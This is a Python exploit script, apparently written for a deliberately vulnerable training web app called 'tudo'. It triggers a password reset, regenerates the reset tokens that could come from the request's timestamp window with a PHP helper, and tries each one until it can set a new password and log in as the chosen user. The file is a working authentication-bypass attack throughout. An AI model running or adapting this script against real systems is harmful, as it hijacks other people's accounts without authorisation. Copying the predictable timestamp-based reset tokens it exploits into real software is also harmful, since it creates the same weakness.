import os
import shutil
import subprocess
import time

import requests

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PHP_FILE = os.path.join(SCRIPT_DIR, "generateTokens.php")


def _get_tokens(lo, hi):
    if shutil.which("php"):
        out = subprocess.check_output(["php", PHP_FILE, str(lo), str(hi)])
    else:
        subprocess.run(
            ["docker", "cp", PHP_FILE, "tudo-app:/tmp/generateTokens.php"],
            check=True,
        )
        out = subprocess.check_output([
            "docker", "exec", "tudo-app", "php",
            "/tmp/generateTokens.php", str(lo), str(hi),
        ])
    return out.decode().strip().split("\n")


def run_auth_bypass(session, target, user, password, padding=20):
    """
 	Reset user password without knowing the old one.
    	Returns True if login works afterwards.
    """
    lo = int(time.time() * 1000) - padding
    r = session.post(
        target + "/forgotpassword.php",
        data={"username": user},
    )
    hi = int(time.time() * 1000) + padding

    if "Email sent!" not in r.text:
        print("[-] forgot password failed")
        return False

    print("[*] reset requested for", user)
    print("[*] trying", hi - lo, "possible tokens")

    try:
        tokens = _get_tokens(lo, hi)
    except Exception as e:
        print("[-] php error:", e)
        return False

    for token in tokens:
        if not token:
            continue

        r = session.get(target + "/resetpassword.php", params={"token": token})
        if "Token is invalid" in r.text:
            continue

        r = session.post(
            target + "/resetpassword.php",
            data={
                "token": token,
                "password1": password,
                "password2": password,
            },
        )
        if "Password changed!" not in r.text:
            continue

        print("[+] token:", token)
        print("[+] password set to", password)

        r = session.post(
            target + "/login.php",
            data={"username": user, "password": password},
            allow_redirects=False,
        )
        if r.status_code == 302:
            print("[+] logged in as", user)
            return True

    print("[-] no token found")
    return False
